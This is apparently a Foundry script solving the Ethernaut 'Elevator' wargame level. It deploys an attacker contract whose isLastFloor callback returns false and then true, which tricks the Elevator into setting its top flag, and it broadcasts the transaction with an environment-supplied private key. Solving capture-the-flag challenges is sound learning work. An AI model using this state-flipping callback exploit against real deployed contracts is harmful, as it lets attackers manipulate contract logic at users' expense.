// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import "../src/Elevator.sol";

contract mybulding
{

    Elevator public elevator = Elevator(0xfC7a868dBa21fF24f7EbEa5738378A538FDf6b7E);
    bool private sw ;
    function isLastFloor(uint256 _floor) external returns (bool)
    {
        
        if(!sw)
        {
            sw = true;
            return false;
        }
        else{
            sw = false;
            return true;
        }

    }
    function attack(uint a) public
    {
        elevator.goTo(a);
    }

}

contract Level11Solution is Script{

Elevator public elevator = Elevator(0xfC7a868dBa21fF24f7EbEa5738378A538FDf6b7E);

function run() external
    {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        mybulding my = new mybulding();
        my.attack(1);
        console.log("top =", elevator.top());
    
        vm.stopBroadcast();
    }

}
